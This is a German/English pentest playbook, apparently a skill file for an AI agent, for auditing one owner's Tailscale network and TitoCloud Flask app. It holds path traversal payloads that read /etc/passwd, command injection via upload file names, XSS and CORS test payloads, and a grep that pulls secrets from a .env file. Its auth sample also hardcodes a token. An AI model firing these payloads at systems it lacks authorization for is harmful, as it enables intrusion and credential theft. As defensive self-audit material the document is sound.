---
name: ethical-hacking
description: Ethical hacking and penetration testing methodology for Tito's own infrastructure. Covers reconnaissance, vulnerability assessment, exploitation simulation, and remediation — tailored to Docker/Hermes, Tailscale network, Flask apps, and Mac Mini.
version: 1.0
tags: [security, ethical-hacking, pentesting, red-team, hardening]
---

# Ethical Hacking — Tito's Infrastructure

> **Purpose:** Systematisch die eigene Infrastruktur auf Schwachstellen prüfen, dokumentieren und beheben. Nur auf eigenen Systemen — nie auf Drittanbieter.

## Phase 1: Reconnaissance (Aufklärung)

### 1.1 Network Discovery
```bash
# Tailscale-Netzwerk scannen
tailscale status  # Alle bekannten Devices

# Port-Scan auf Tailscale-Device (Beispiel FSU Mac)
timeout 5 bash -c "echo >/dev/tcp/<PRIVATE_IP>/22" && echo "SSH open" || echo "SSH closed"

# Alle TCP-Ports scannen (nmap falls installiert, sonst bash)
for port in 22 80 443 8080 8443 8090 8123 8581 3306 5432 6379; do
  timeout 2 bash -c "echo >/dev/tcp/<PRIVATE_IP>/$port" 2>/dev/null && echo "Port $port OPEN on Mac Mini"
done

# Lokal (innerhalb des Docker-Containers)
ss -tlnp  # Alle lauschenden Ports
```

### 1.2 Service Fingerprinting
```bash
# HTTP-Header analysieren
curl -sI http://<PRIVATE_IP>:8090/ | head -20

# TLS-Zertifikate prüfen
echo | openssl s_client -connect <PRIVATE_IP>:443 2>/dev/null | openssl x509 -noout -text | head -30

# SSH-Banner grabben
ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 titoprause@<PRIVATE_IP> "cat /etc/os-release" 2>/dev/null | head -5
```

### 1.3 Information Gathering
```bash
# DNS & Netzwerk
ip route                                    # Routing-Tabelle
cat /etc/resolv.conf                        # DNS-Config
tailscale status --json 2>/dev/null | python3 -m json.tool | head -50

# Laufende Prozesse & deren User
ps aux --sort=-%mem | head -20

# Installierte Software (Angriffsfläche)
pip3 list 2>/dev/null | head -30
apt list --installed 2>/dev/null | head -30
which nmap nikto hydra john sqlmap 2>/dev/null  # Pentest-Tools vorhanden?
```

## Phase 2: Vulnerability Assessment

### 2.1 Bekannte Schwachstellen (Audit vom 20.05.2026)

| ID | Severity | Komponente | Schwachstelle | Status |
|----|----------|------------|---------------|--------|
| V-01 | CRITICAL | TitoCloud Flask | Keine Authentifizierung auf API-Endpoints | ✅ FIXED |
| V-02 | CRITICAL | TitoCloud Flask | Path Traversal in Video-Upload/serve | ✅ FIXED |
| V-03 | HIGH | TitoCloud Flask | `Access-Control-Allow-Origin: *` (CORS Wildcard) | ✅ FIXED |
| V-04 | HIGH | TitoCloud Flask | `subprocess.run()` für ffmpeg mit User-Input (Command Injection) | ✅ FIXED |
| V-05 | HIGH | TitoCloud Flask | Kein Rate-Limiting auf allen Endpoints | OPEN |
| V-06 | HIGH | Secrets | `.env` Datei world-readable (644) | ✅ FIXED (→ 600) |
| V-07 | MEDIUM | TitoCloud Flask | Kein HTTPS-Enforcement | OPEN |
| V-08 | MEDIUM | TitoCloud Flask | `0.0.0.0:8090` (API jetzt auth-geschützt) | PARTIAL (Auth added, still 0.0.0.0) |
| V-09 | MEDIUM | FileBrowser | Proxy leitet Auth-Header weiter | ACCEPTED (by design) |
| V-10 | LOW | System | 4+ Zombie-Prozesse | OPEN (harmless, parent must reap) |
| V-11 | LOW | System | Swap fast voll | OPEN |
| V-12 | INFO | Container | Keine Capabilities (CapEff: 0000000000000000) — GOOD | OK |
| V-13 | INFO | Container | Keine SUID-Binaries gefunden — GOOD | OK |
| V-14 | INFO | Container | Läuft als `hermes` User, nicht root — GOOD | OK |

### 2.2 Systematic Vulnerability Scanning
```bash
# Python-basierter Portscanner (kein nmap nötig)
python3 -c "
import socket, concurrent.futures
target = '<PRIVATE_IP>'  # Mac Mini
def scan(port):
    s = socket.socket()
    s.settimeout(1)
    if s.connect_ex((target, port)) == 0:
        return port
    s.close()
with concurrent.futures.ThreadPoolExecutor(max_workers=100) as e:
    open_ports = list(filter(None, e.map(scan, range(1, 1024))))
print(f'Open ports: {open_ports}')
"

# HTTP Security Headers prüfen
curl -sI http://localhost:8090/ | grep -iE '(x-frame|x-content-type|content-security|x-xss|strict-transport|permissions-policy)'

# Flask-Debug-Modus prüfen
curl -s http://localhost:8090/nonexistent_page_404_test | head -20
# Wenn Stacktrace sichtbar → Debug-Modus aktiv (CRITICAL)
```

### 2.3 Web Application Security Testing
```bash
# Path Traversal Test
curl -s "http://localhost:8090/video/uploads/..%2F..%2F..%2Fetc%2Fpasswd" | head -5
curl -s "http://localhost:8090/video/uploads/../../../etc/passwd" | head -5

# Command Injection Test (ffmpeg input)
curl -s -X POST http://localhost:8090/api/upload/video \
  -F "file=@/dev/null;filename=\"test;id;.mp4\"" | head -5

# XSS Test (Task-Titel)
curl -s -X POST http://localhost:8090/api/tasks \
  -H "Content-Type: application/json" \
  -d '{"title":"<script>alert(1)</script>","category":"arbeit"}'

# CORS Wildcard Test
curl -sI -H "Origin: http://evil.com" http://localhost:8090/api/tasks | grep -i access-control

# Auth Bypass Test
curl -s http://localhost:8090/api/tasks | python3 -m json.tool | head -5
# Wenn Daten zurückkommen OHNE Auth → V-01 bestätigt

# Upload ohne Auth Test
curl -s -X POST http://localhost:8090/api/upload/video \
  -F "file=@/dev/null;filename=test.mp4" | head -5
# Wenn Upload klappt OHNE Auth → V-01 bestätigt
```

## Phase 3: Exploitation (Simulation)

### 3.1 Exploit-Vektoren

**V-01: Unauth API Access** — Tasks lesen/schreiben/löschen ohne Login:
```bash
# Lesen
curl http://<PRIVATE_IP>:8090/api/tasks
# Schreiben
curl -X POST http://<PRIVATE_IP>:8090/api/tasks \
  -H "Content-Type: application/json" \
  -d '{"title":"PWNED","category":"arbeit"}'
# Löschen
curl -X DELETE http://<PRIVATE_IP>:8090/api/tasks/arbeit/TASK_ID
```

**V-02: Path Traversal** — Dateien außerhalb des Video-Verzeichnisses lesen:
```bash
# /etc/passwd lesen
curl "http://<PRIVATE_IP>:8090/video/uploads/..%2F..%2F..%2Fetc%2Fpasswd"
# FileBrowser DB lesen
curl "http://<PRIVATE_IP>:8090/video/uploads/..%2F..%2Ffilebrowser-db%2Ffilebrowser.db"
```

**V-04: Command Injection via ffmpeg** — OS-Befehle einschleusen:
```bash
# Semikolon im Filename → Command Injection
curl -X POST http://<PRIVATE_IP>:8090/api/upload/video \
  -F "file=@/dev/null;filename=\"test$(whoami).mp4\""
```

**V-06: .env Leak** — Secrets aus world-readable Config:
```bash
# Als hermes-User (innerhalb des Containers)
cat /opt/data/.env | grep -iE '(token|key|secret|password)'
```

### 3.2 Post-Exploitation Szenarien

Wenn ein Angreifer V-02 ausnutzt und `/opt/data/.env` liest:
- Telegram Bot Token → Fake-Nachrichten an User
- Git Credentials → Repo-Zugriff, Code Injection
- SSH Private Key → Zugriff auf Mac Mini und andere Tailscale-Geräte

Wenn V-04 ausgenutzt wird (Command Injection):
- Container-Übernahme als `hermes` User
- Lesen aller Dateien in `/opt/data/`
- Potentiell: Secrets, Tasks, FileBrowser-DB

## Phase 4: Remediation

### 4.1 CRITICAL Fixes (sofort)
```bash
# V-06: .env Permissions härten
chmod 600 /opt/data/.env

# V-01: Auth-Middleware zu Flask hinzufügen
# Siehe Patch-Vorlage unten (auth_middleware)
```

### 4.2 HIGH Fixes (bald)
```bash
# V-02: Filename-Sanitization
import re
def sanitize_filename(filename):
    # Nur alphanumerisch, Punkte, Bindestriche erlauben
    clean = re.sub(r'[^a-zA-Z0-9._-]', '', filename)
    # Pfad-Traversal verhindern
    clean = clean.replace('..', '').replace('/', '').replace('\\', '')
    return clean

# V-03: CORS einschränken
# Statt Access-Control-Allow-Origin: *
# Nur Tailscale-IPs und localhost erlauben

# V-04: subprocess absichern
# Statt subprocess.run(cmd mit User-Input)
# shlex.quote() verwenden oder shlex.split()

# V-05: Rate-Limiting
# Flask-Limiter oder einfacher Token-Bucket
```

### 4.3 Auth-Middleware für TitoCloud
```python
# In titocloud.py einfügen:

from functools import wraps
import hashlib, time

# Einfache Token-Auth (Tailscale-only + API-Key)
API_TOKENS = {
    "tito-cloud-key": "titoprause"  # In .env auslagern!
}

def require_auth(f):
    @wraps(f)
    def wrapper(self, *args, **kwargs):
        # 1. Tailscale-IPs sind trusted (kein Auth nötig)
        client_ip = self.client_address[0]
        if client_ip.startswith('100.'):  # Tailscale-Range
            return f(self, *args, **kwargs)
        
        # 2. API-Key Auth für externe Zugriffe
        auth = self.headers.get('Authorization', '')
        if auth.startswith('Bearer '):
            token = auth[7:]
            if token in API_TOKENS:
                return f(self, *args, **kwargs)
        
        self.send_response(401)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(b'{"error":"Unauthorized"}')
    return wrapper

# Auf alle /api/ Endpoints anwenden:
@require_auth
def do_GET(self):
    ...
```

### 4.4 MEDIUM Fixes
```bash
# V-07: HTTPS (über Tailscale Reverse Proxy oder Caddy)
# Tailscale serve --bg --https 443 http://localhost:8090

# V-08: An 127.0.0.1 binden + Tailscale serve als Proxy
# In titocloud.py: server = ThreadedHTTPServer(("127.0.0.1", 8090), ...)
# Dann: tailscale serve --bg http://127.0.0.1:8090

# V-10: Zombie-Prozesse aufräumen
# FileBrowser-Zombies killen
ps aux | grep defunct | awk '{print $2}' | xargs kill -9 2>/dev/null
```

## Phase 5: Reporting

### Report-Template
```markdown
# Penetration Test Report — [Datum]

## Executive Summary
- [ ] X CRITICAL Schwachstellen
- [ ] X HIGH Schwachstellen
- [ ] X MEDIUM Schwachstellen
- [ ] X LOW Schwachstellen

## Scope
- Ziel: Hermes Container (<PRIVATE_IP>), TitoCloud (Port 8090)
- Zeitraum: [Datum]
- Tester: Toti (autorisiert durch Tito)

## Findings
| ID | Severity | Titel | Beschreibung | Proof of Concept | Remediation | Status |
|----|----------|-------|--------------|------------------|-------------|--------|

## Risk Rating
- CRITICAL: Sofort beheben, System ist aktiv angreifbar
- HIGH: Innerhalb von 7 Tagen beheben
- MEDIUM: Innerhalb von 30 Tagen beheben
- LOW: Bei Gelegenheit beheben

## Methodology
OWASP Top 10 + Infrastructure Penetration Testing
```

## Wöchentlicher Security-Check (Cronjob)
```bash
#!/bin/bash
# quick-security-check.sh — Wöchentlich via Cron

echo "=== $(date) Security Check ==="

# 1. Offene Ports
ss -tlnp | grep -v "127.0.0" > /tmp/open_ports.txt

# 2. .env Permissions
stat -c '%a' /opt/data/.env >> /tmp/security_log.txt

# 3. Zombie-Prozesse
ps aux | grep -c defunct >> /tmp/security_log.txt

# 4. Swap Usage
free -h | grep Swap >> /tmp/security_log.txt

# 5. Neue SSH-Keys
find /opt/data/.ssh -newer /tmp/last_security_check -name "*.pub" 2>/dev/null

# 6. Disk Space
df -h / >> /tmp/security_log.txt

touch /tmp/last_security_check
```

## Angriffsflächen-Übersicht

```
┌─────────────────────────────────────────────────────┐
│                    TAILSCALE-NETZ                   │
│  <PRIVATE_IP>/10 — Mutualerkennung automatisch       │
├──────────────────┬──────────────────────────────────┤
│  Tailscale-IP    │  Device           │ Status       │
├──────────────────┼───────────────────┼──────────────┤
│  <PRIVATE_IP>  │  Hermes (Docker)  │ ONLINE       │
│  <PRIVATE_IP>   │  Mac Mini         │ OFFLINE      │
│  <PRIVATE_IP>    │  FSU Mac          │ IDLE         │
│  <PRIVATE_IP>  │  iPhone 15 Pro    │ ONLINE       │
│  <PRIVATE_IP>    │  Apple TV         │ OFFLINE      │
│  <PRIVATE_IP>  │  Kali Linux       │ OFFLINE      │
├──────────────────┴───────────────────┴──────────────┤
│                                                     │
│  ┌────────────────────┐   ┌────────────────────┐   │
│  │  Hermes Container  │   │  TitoCloud Flask   │   │
│  │  Port 8090 (0.0.0.0)│   │  ⚠ NO AUTH          │   │
│  │                    │──▶│  ⚠ PATH TRAVERSAL   │   │
│  │  🔓 V-01 bis V-09 │   │  ⚠ CORS *           │   │
│  └────────────────────┘   └────────────────────┘   │
│         │                                            │
│    ┌────┴─────┐                                     │
│    │  .env    │ ⚠ 644 (world-readable)             │
│    │  SSH Key │ ✅ 600 (secure)                    │
│    │  Git     │ ✅ 600 (secure)                    │
│    └──────────┘                                     │
└─────────────────────────────────────────────────────┘
```

## Praktische Testing-Pitfalls (Trial & Error gelernt)

1. **Curl normalisiert Pfade** — `curl "http://host/../../../etc/passwd"` sendet `/etc/passwd`, nicht den Traversal-Pfad. IMMER `--path-as-is` flag verwenden: `curl --path-as-is "http://host/../../../etc/passwd"`
2. **localhost ist immer "trusted"** — Wenn Auth-Traffic von localhost kommt, wird es durchgelassen. Kann Auth-Schutz nicht von derselben Maschine testen. Externen Test brauchen (z.B. von iPhone/andere Tailscale-Device)
3. **Python bytes-Literals dürfen kein Unicode** — `b'string — dash'` wirft SyntaxError. Em-dash (—) muss ASCII-dash (-) sein in bytes-Literalen
4. **Zombie-Prozesse lassen sich nicht killen** — `kill -9` funktioniert nicht auf Zombies (Prozess existiert nur noch als Eintrag, Parent muss `wait()` aufrufen). Harmlos, aber Indikator für Process-Management-Issues
5. **Patch-Tool kann Einrückung verlieren** — Bei Python-Dateien: nach jedem Patch Syntax-Check mit `py_compile` durchführen. Niemals davon ausgehen, dass Einrückung erhalten bleibt
6. **FileBrowser startet als Subprozess von Flask** — Beim Neustart von Flask muss FileBrowser separat neugestartet werden (oder der Flask-Code startet FB automatisch im `__main__`)
7. **`stat -c '%a'` statt `ls -la`** — Für Permissions-Check Oktal-Notation verwenden (z.B. `600` statt `-rw-------`)
8. **Auth-Test Reihenfolge** — Erst Syntax-Check (`py_compile`), dann Server neustarten, dann Tests laufen. Server stürzt bei SyntaxError ohne Log ab

## Praktische Remediation-Patterns (TitoCloud Audit 20.05.2026)

### Flask Auth Middleware (V-01 Fix)
```python
class Handler(BaseHTTPRequestHandler):
    TAILSCALE_PREFIXES = ("100.",)
    API_TOKENS = {}  # Populated from TITOCLOUD_API_TOKENS env var

    def _is_tailscale(self):
        return any(self.client_address[0].startswith(p) for p in self.TAILSCALE_PREFIXES)

    def _require_auth(self):
        if self._is_tailscale() or self.client_address[0] in ("127.0.0.1", "::1"):
            return True
        auth = self.headers.get("Authorization", "")
        if auth.startswith("Bearer ") and auth[7:] in self.API_TOKENS:
            return True
        self.send_response(401)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        # PITFALL: bytes literals must be ASCII! No em-dash (—) or unicode!
        self.wfile.write(b'{"error":"Unauthorized - use Tailscale or API token"}')
        return False

    def do_GET(self):
        if self.path.startswith(("/api/", "/video/uploads/", "/video/hls/")):
            if not self._require_auth():
                return
        # ... rest of handler
```

### Path Traversal Prevention (V-02 Fix)
```python
import os, re

ALLOWED_VIDEO_EXTS = {".mp4", ".mkv", ".avi", ".mov", ".webm"}

def sanitize_filename(filename):
    clean = os.path.basename(filename)  # Strip path components
    clean = re.sub(r'[^a-zA-Z0-9._\-\s]', '', clean)  # Remove dangerous chars
    clean = re.sub(r'\.+', '.', clean)  # Collapse multiple dots
    clean = re.sub(r'\s+', ' ', clean).strip()
    name, ext = os.path.splitext(clean)
    if ext.lower() not in ALLOWED_VIDEO_EXTS:
        ext = '.mp4'  # Default to safe extension
    return name[:100] + ext.lower() if name else f"upload_{uuid.uuid4().hex[:8]}{ext}"

def is_path_safe(requested_path, base_dir):
    resolved = (base_dir / requested_path).resolve()
    return str(resolved).startswith(str(base_dir.resolve()))
```

### CORS Restriction (V-03 Fix)
```python
# BEFORE (INSECURE): self.send_header("Access-Control-Allow-Origin", "*")
# AFTER (RESTRICTED):
origin = self.headers.get("Origin", "")
if origin and (origin.startswith("https://100.") or origin.startswith("http://100.") or "localhost" in origin):
    self.send_header("Access-Control-Allow-Origin", origin)
```

### File Permissions Hardening (V-06 Fix)
```bash
chmod 600 /opt/data/.env  # Was 644 (world-readable!)
```

## Pitfalls (Learned the Hard Way)

1. **bytes literals must be ASCII** — `b'...'` cannot contain em-dash (—) or any non-ASCII char. Use `-` instead. Python will throw `SyntaxError: bytes can only contain ASCII literal characters`.
2. **Patching indentation** — When using find-replace patches on Python, always verify indentation matches the surrounding code. A `self.` call without leading spaces becomes top-level = `IndentationError`.
3. **Test with `--path-as-is`** — curl normalizes `../../` in URLs before sending. Use `curl --path-as-is` to test actual path traversal attacks.
4. **HTTP 000 = connection refused** — When testing security fixes, HTTP code 000 means the server didn't start (syntax error). Always syntax-check with `python3 -c "import py_compile; py_compile.compile(file, doraise=True)"` before restarting.
5. **Zombie processes** — `kill -9` does NOT work on zombies (state Z). Zombies are already dead; the parent must call `wait()`. Harmless but indicate process management issues.
6. **Tailscale auth is trusted** — localhost (127.0.0.1) and 100.x.x.x IPs bypass auth by design. Only external IPs need Bearer token.
7. **Keine Tokens/Secrets im Chat** — Telegram ist nicht E2E-verschlüsselt. Tokens gehören in `.env`/Credentials-Files, nie im Chat-Verlauf